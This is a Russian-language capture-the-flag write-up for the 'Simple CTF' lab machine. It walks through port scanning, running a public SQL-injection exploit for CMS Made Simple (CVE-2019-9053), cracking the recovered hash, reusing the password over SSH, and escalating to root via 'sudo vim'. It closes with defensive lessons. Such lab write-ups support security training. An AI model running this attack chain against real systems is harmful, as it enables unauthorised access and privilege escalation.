# Simple CTF

**Сложность:** Easy
**Техники:** SQL-инъекция в CMS Made Simple (CVE-2019-9053) · офлайн-взлом хеша · повышение привилегий через `sudo vim`

## Разведка
```bash
nmap -sS -sV -p- -oN portscan.nmap <ip>
```
```
21/tcp   open  ftp     vsftpd 3.0.3        (анонимный вход разрешён)
80/tcp   open  http    Apache 2.4.18
2222/tcp open  ssh     OpenSSH 7.2p2
```
SSH на нестандартном порту (2222) — пригодится позже.

## Энумерация
```bash
gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
`/simple/` → **CMS Made Simple 2.2.8**.
```bash
searchsploit "CMS Made Simple 2.2.8"
# CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py (CVE-2019-9053)
searchsploit -m 46635
```

## Эксплуатация — SQL-инъекция (CVE-2019-9053)
Эксплойт на Python 2 — поправил `print`/`cprint`, затем:
```bash
python2 46635.py -u http://<ip>/simple --crack -w /usr/share/wordlists/rockyou.txt
# [+] Username found: mitch
# [+] Password cracked: secret
```
Слепая SQLi сливает пользователя, соль и хеш пароля; эксплойт подбирает его по rockyou → `mitch : secret`.

## Закрепление
Переиспользование пароля на SSH (порт 2222):
```bash
ssh mitch@<ip> -p 2222      # пароль: secret
```
`user.txt` получен.

## Повышение привилегий — sudo vim
```bash
sudo -l
#   (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
```
`vim` умеет запускать шелл; через sudo он стартует от root → **root**. `root.txt` получен. (GTFOBins: `vim` — классика злоупотребления sudo.)

## Выводы
- Устаревшая CMS с публичным CVE = мгновенный вход. Патч-менеджмент важен.
- Переиспользование пароля (web → SSH) превращает одну утечку в доступ к шеллу.
- `NOPASSWD` на интерактивном бинарнике (`vim`) = прямой путь к root. Никогда не давать sudo на редакторы/пейджеры.
